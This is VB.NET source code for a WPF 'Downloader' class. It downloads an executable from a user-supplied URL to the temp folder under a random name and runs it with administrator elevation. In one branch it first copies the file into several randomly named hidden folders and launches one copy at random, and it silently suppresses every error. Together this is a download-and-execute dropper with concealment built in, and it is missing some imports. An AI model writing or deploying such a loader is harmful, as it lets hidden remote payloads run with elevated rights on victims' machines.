Imports System
Imports System.IO
Imports System.Net
Imports System.Threading.Tasks
Imports System.Windows

Public Class Downloader
    Private Async Sub Download_Click(sender As Object, e As RoutedEventArgs)
        Dim url = TextBlock1.Text.Trim()
        If String.IsNullOrEmpty(url) Then Return

        Try
            Await DownloadFileAsync(url)
        Catch ex As Exception
        End Try
    End Sub

    Private Async Function DownloadFileAsync(url As String) As Task
        If CheckBox1.IsChecked Then
            Dim randomName = $"{Guid.NewGuid().ToString("N").Substring(0, 32)}.exe"
            Dim tempPath = Path.Combine(Path.GetTempPath(), randomName)

            Using client As New WebClient()
                AddHandler client.DownloadProgressChanged, AddressOf Client_DownloadProgressChanged
                Await client.DownloadFileTaskAsync(New Uri(url), tempPath)
            End Using

            Dim folderNames As List(Of String) = New List(Of String)
            For i As Integer = 1 To 4 + (New Random().Next(9))
                Dim folderName = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid().ToString("N").Substring(0, 32)}")
                Directory.CreateDirectory(folderName)
                File.SetAttributes(folderName, FileAttributes.Hidden)
                folderNames.Add(folderName)
            Next

            For Each folder In folderNames
                File.Copy(tempPath, Path.Combine(folder, randomName))
            Next

            Dim processStartInfo = New ProcessStartInfo With {
                .FileName = Path.Combine(folderNames(New Random().Next(folderNames.Count)), randomName),
                .Verb = "runas"
            }
            Try
                Process.Start(processStartInfo)
            Catch ex As Exception
            End Try
        Else
            Dim tempPath = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid().ToString("N").Substring(0, 32)}.exe")
            Using client As New WebClient()
                AddHandler client.DownloadProgressChanged, AddressOf Client_DownloadProgressChanged
                Await client.DownloadFileTaskAsync(New Uri(url), tempPath)
            End Using

            Dim processStartInfo = New ProcessStartInfo With {
                .FileName = tempPath,
                .Verb = "runas"
            }
            Try
                Process.Start(processStartInfo)
            Catch ex As Exception
            End Try
        End If
    End Function

    Private Sub Client_DownloadProgressChanged(sender As Object, e As DownloadProgressChangedEventArgs)
        Dispatcher.Invoke(Sub() ProgressBar1.Value = e.ProgressPercentage)
    End Sub
End Class
